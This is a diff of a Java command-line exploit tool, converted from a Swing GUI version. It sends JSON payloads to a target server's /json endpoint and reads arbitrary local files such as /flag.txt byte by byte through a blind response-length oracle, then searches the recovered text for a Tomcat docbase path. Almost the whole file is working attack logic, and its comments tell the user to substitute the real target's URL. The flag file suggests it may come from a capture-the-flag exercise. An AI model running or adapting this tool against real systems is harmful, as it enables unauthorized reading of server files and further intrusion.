@@ -1,52 +1,42 @@
 package com.huarui;
 
-import javax.swing.*;
-
 import java.io.*;
+import java.nio.charset.StandardCharsets;
+import java.util.*;
+import java.util.regex.*;
 import java.net.HttpURLConnection;
 import java.net.URL;
-import java.nio.charset.StandardCharsets;
-import java.util.ArrayList;
-import java.util.List;
-import java.util.regex.Matcher;
-import java.util.regex.Pattern;
 
-import static com.huarui.GUI.printToTextArea;
-
-public class coi {
-    //public void runcoi(JTextArea textArea,String text){
-        //printToTextArea(textArea, "Hello, World!");
-        //printToTextArea(textArea, "file: " + text);
-    static String url = "http://127.0.0.1:8080/json";
+public class coitext {
+    // 直接定义目标服务器 URL
+    private static final String url = "http://127.0.0.1:8080/json"; // 替换为目标服务器的实际 URL
     private static final int TIMEOUT = 5000;
-    static String fileToRead = "file:///flag.txt";
+    private static String fileToRead = "file:///flag.txt";
 
-    public void runcoi(JTextArea textArea,String text,String urltext) {
-        step1(textArea);
-        fileToRead = "file:///" + text;
-        url = urltext;
-        String docbase = step2(textArea);
+    public static void main(String[] args) {
+        step1();
+        String docbase = step2();
         if (docbase == null) {
         } else {
-            printToTextArea(textArea, "docbase: " + docbase);
+            System.out.println("docbase: " + docbase);
         }
     }
 
-    private static void step1(JTextArea textArea) {
+    private static void step1() {
         try {
             String step1Payload = readFile("payload/step1.json");
-            sendJson(step1Payload,textArea);
+            sendJson(step1Payload);
         } catch (IOException e) {
-            printToTextArea(textArea, "加载 step1.json 时出错: " + e.getMessage());
+            System.out.println("加载 step1.json 时出错: " + e.getMessage());
         }
     }
 
-    private static String step2(JTextArea textArea) {
+    private static String step2() {
         try {
             String step2Payload = readFile("payload/step2.json");
             step2Payload = step2Payload.replace("${file}", fileToRead);
 
-            int falseLen = sendJson(step2Payload.replace("${data}", "[1]"),textArea).length();
+            int falseLen = sendJson(step2Payload.replace("${data}", "[1]")).length();
             boolean flag = true;
             List<Integer> result = new ArrayList<>();
             String data;
@@ -55,29 +45,25 @@ public class coi {
             System.out.println("读取文件中...");
             while (flag) {
                 data = resultToString(result);
-                printToTextArea(textArea, data);
                 System.out.println(data);
 
                 for (int i = 0; i < 256; i++) {
                     List<Integer> tmp = new ArrayList<>(result);
                     tmp.add(i);
                     String payload = step2Payload.replace("${data}", tmp.toString());
-                    String response = sendJson(payload,textArea);
+                    String response = sendJson(payload);
 
                     if (response.length() != falseLen) {
                         result.add(i);
                         if (i == 0xA) {
-                            printToTextArea(textArea, "[+] 检查中...");
                             System.out.println("[+] 检查中...");
                             data = resultToString(result);
                             Matcher matcher = Pattern.compile("tomcat-docbase\\.\\d+\\.\\d+").matcher(data);
                             if (matcher.find()) {
                                 docbase = matcher.group();
-                                printToTextArea(textArea, "[+] 找到 docbase: " + docbase);
                                 System.out.println("[+] 找到 docbase: " + docbase);
                                 flag = false;
                             } else {
-                                printToTextArea(textArea, "[-] 未找到 docbase");
                                 System.out.println("[-] 未找到 docbase");
                             }
                         }
@@ -89,9 +75,10 @@ public class coi {
                     }
                 }
             }
-            printToTextArea(textArea, "--------------------------------");
-            printToTextArea(textArea, "[+] 结果: \n" + resultToString(result));
-            printToTextArea(textArea, "--------------------------------");
+
+            System.out.println("--------------------------------");
+            System.out.println("[+] 结果: \n" + resultToString(result));
+            System.out.println("--------------------------------");
 
             return docbase.isEmpty() ? null : docbase;
         } catch (IOException e) {
@@ -100,7 +87,7 @@ public class coi {
         }
     }
 
-    private static String sendJson(String payload,JTextArea textArea) {
+    private static String sendJson(String payload) {
         try {
             HttpURLConnection connection = (HttpURLConnection) new URL(url).openConnection();
             connection.setRequestMethod("POST");
@@ -123,7 +110,7 @@ public class coi {
             }
             return response.toString();
         } catch (IOException e) {
-            printToTextArea(textArea, "发送请求失败: " + e.getMessage());
+            System.out.println("发送请求失败: " + e.getMessage());
             return "";
         }
     }
@@ -146,8 +133,4 @@ public class coi {
         }
         return data.toString();
     }
-
-
-
-
 }
